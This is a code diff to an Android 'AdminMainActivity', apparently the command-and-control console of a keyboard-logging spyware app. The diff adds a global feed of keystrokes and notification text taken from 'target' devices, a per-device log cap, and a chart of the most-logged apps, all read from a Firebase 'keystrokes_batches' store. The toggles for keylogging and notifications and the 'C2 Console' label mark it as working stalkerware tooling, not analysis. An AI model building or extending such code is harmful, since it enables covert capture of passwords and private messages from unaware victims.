@@ -2,11 +2,12 @@ package com.example.mykeyboardadmin
 
 import android.graphics.Color
 import android.os.Bundle
+import android.text.method.ScrollingMovementMethod
 import android.view.LayoutInflater
-import android.view.MotionEvent
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
+import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -26,6 +27,8 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
     private lateinit var txtTotalDevices: TextView
     private lateinit var txtTotalEvents: TextView
+    private lateinit var txtGlobalLogConsole: TextView
+    private lateinit var containerTopApps: LinearLayout
 
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
@@ -36,6 +39,12 @@ class AdminMainActivity : AppCompatActivity() {
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
         var logFeed: String = "Waiting for telemetry..."
+    )
+
+    data class LogEntry(
+        val timestamp: Long,
+        val appName: String,
+        val text: String
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -49,11 +58,15 @@ class AdminMainActivity : AppCompatActivity() {
 
         txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
         txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
+        txtGlobalLogConsole = findViewById<TextView>(R.id.txtGlobalLogConsole)
+        txtGlobalLogConsole.movementMethod = ScrollingMovementMethod()
+        containerTopApps = findViewById<LinearLayout>(R.id.containerTopApps)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
             loadConnectedDevices()
-            Toast.makeText(this, "C2 Console synced!", Toast.LENGTH_SHORT).show()
+            loadGlobalLogsAndAnalytics()
+            Toast.makeText(this, "C2 Console optimized & synced!", Toast.LENGTH_SHORT).show()
         }
 
         recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
@@ -75,13 +88,13 @@ class AdminMainActivity : AppCompatActivity() {
         recyclerView.adapter = adapter
 
         loadConnectedDevices()
+        loadGlobalLogsAndAnalytics()
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                var totalEventCount = 0
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
                     if (deviceList.none { it.name == deviceName }) {
@@ -90,18 +103,27 @@ class AdminMainActivity : AppCompatActivity() {
                         listenToDeviceState(deviceName)
                         listenToDeviceLogs(deviceName)
                     }
-                    for (appChild in child.children) {
-                        for (entry in appChild.children) {
-                            val text = entry.child("text").getValue(String::class.java)
-                                ?: entry.child("title").getValue(String::class.java)
-                                ?: entry.child("typedContent").getValue(String::class.java)
-                                ?: continue
-                            if (text.isNotBlank() && text != "null") totalEventCount++
-                        }
+                }
+                txtTotalDevices.text = deviceList.size.toString()
+                adapter.notifyDataSetChanged()
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+
+        val batchRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        batchRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                for (child in snapshot.children) {
+                    val deviceName = child.key ?: continue
+                    if (deviceList.none { it.name == deviceName }) {
+                        val device = DeviceModel(deviceName)
+                        deviceList.add(device)
+                        listenToDeviceState(deviceName)
+                        listenToDeviceLogs(deviceName)
                     }
                 }
                 txtTotalDevices.text = deviceList.size.toString()
-                txtTotalEvents.text = totalEventCount.toString()
                 adapter.notifyDataSetChanged()
             }
 
@@ -162,6 +184,55 @@ class AdminMainActivity : AppCompatActivity() {
         }
     }
 
+    private fun loadGlobalLogsAndAnalytics() {
+        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        logRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val allEntries = mutableListOf<LogEntry>()
+                val appCounts = mutableMapOf<String, Int>()
+                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+
+                for (deviceChild in snapshot.children) {
+                    val deviceName = deviceChild.key ?: "Device"
+                    for (appChild in deviceChild.children) {
+                        val rawApp = appChild.key ?: continue
+                        val prettyApp = getPrettyAppName(rawApp)
+                        for (entry in appChild.children) {
+                            val text = entry.child("text").getValue(String::class.java)
+                                ?: entry.child("title").getValue(String::class.java)
+                                ?: entry.child("typedContent").getValue(String::class.java)
+                                ?: continue
+
+                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+
+                            if (text.isNotBlank() && text != "null") {
+                                allEntries.add(LogEntry(timestampMillis, "$deviceName: $prettyApp", text))
+                                appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
+                            }
+                        }
+                    }
+                }
+
+                // Sort latest activity on top and optimize for large data by capping to latest 300 entries
+                allEntries.sortByDescending { it.timestamp }
+                val limitedEntries = allEntries.take(300)
+
+                txtTotalEvents.text = allEntries.size.toString()
+
+                val sb = StringBuilder()
+                for (item in limitedEntries) {
+                    val timeStr = timeFormat.format(Date(item.timestamp))
+                    sb.append("[$timeStr] ${item.appName}  |  ${item.text}\n")
+                }
+                txtGlobalLogConsole.text = if (sb.isNotEmpty()) sb.toString() else "No target logs recorded yet."
+
+                updateTopAppsUI(appCounts, allEntries.size)
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
     private fun listenToDeviceLogs(deviceName: String) {
         val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
@@ -186,11 +257,12 @@ class AdminMainActivity : AppCompatActivity() {
                     }
                 }
 
-                // Sort newest on top
+                // Sort newest on top and cap to 150 entries for high performance
                 entries.sortByDescending { it.first }
+                val limitedEntries = entries.take(150)
 
                 val sb = StringBuilder()
-                for (item in entries) {
+                for (item in limitedEntries) {
                     val timeStr = timeFormat.format(Date(item.first))
                     sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                 }
@@ -204,6 +276,75 @@ class AdminMainActivity : AppCompatActivity() {
 
             override fun onCancelled(error: DatabaseError) {}
         })
+    }
+
+    private fun updateTopAppsUI(appCounts: Map<String, Int>, totalEvents: Int) {
+        containerTopApps.removeAllViews()
+        val sortedApps = appCounts.entries.sortedByDescending { it.value }.take(3)
+
+        if (sortedApps.isEmpty()) {
+            val emptyTv = TextView(this).apply {
+                text = "No application data yet."
+                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
+                setTextColor(Color.parseColor("#666666"))
+            }
+            containerTopApps.addView(emptyTv)
+            return
+        }
+
+        for ((appName, count) in sortedApps) {
+            val percent = if (totalEvents > 0) (count * 100) / totalEvents else 0
+
+            val itemLayout = LinearLayout(this).apply {
+                orientation = LinearLayout.VERTICAL
+                setPadding(0, 8, 0, 8)
+            }
+
+            val labelRow = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+            }
+
+            val nameTv = TextView(this).apply {
+                text = appName
+                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 13f)
+                setTypeface(null, android.graphics.Typeface.BOLD)
+                setTextColor(Color.parseColor("#1A1A1A"))
+                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
+            }
+
+            val countTv = TextView(this).apply {
+                text = "$count ($percent%)"
+                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
+                setTextColor(Color.parseColor("#666666"))
+            }
+
+            labelRow.addView(nameTv)
+            labelRow.addView(countTv)
+            itemLayout.addView(labelRow)
+
+            val barBg = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 8).apply { topMargin = 4 }
+                setBackgroundColor(Color.parseColor("#E0E0E0"))
+            }
+
+            val barFill = View(this).apply {
+                val weight = if (percent > 0) percent.toFloat() / 100f else 0.01f
+                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
+                setBackgroundColor(Color.parseColor("#0277BD"))
+            }
+
+            val barEmpty = View(this).apply {
+                val weight = if (percent < 100) (100 - percent).toFloat() / 100f else 0.01f
+                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
+            }
+
+            barBg.addView(barFill)
+            barBg.addView(barEmpty)
+            itemLayout.addView(barBg)
+
+            containerTopApps.addView(itemLayout)
+        }
     }
 
     class DeviceAdapter(
@@ -244,12 +385,13 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#DA3633"))
             }
 
+            holder.txtLog.movementMethod = ScrollingMovementMethod()
             holder.scrollView.setOnTouchListener { v, event ->
                 when (event.action) {
-                    MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
+                    android.view.MotionEvent.ACTION_DOWN, android.view.MotionEvent.ACTION_MOVE -> {
                         v.parent.requestDisallowInterceptTouchEvent(true)
                     }
-                    MotionEvent.ACTION_UP -> {
+                    android.view.MotionEvent.ACTION_UP -> {
                         v.parent.requestDisallowInterceptTouchEvent(false)
                     }
                 }
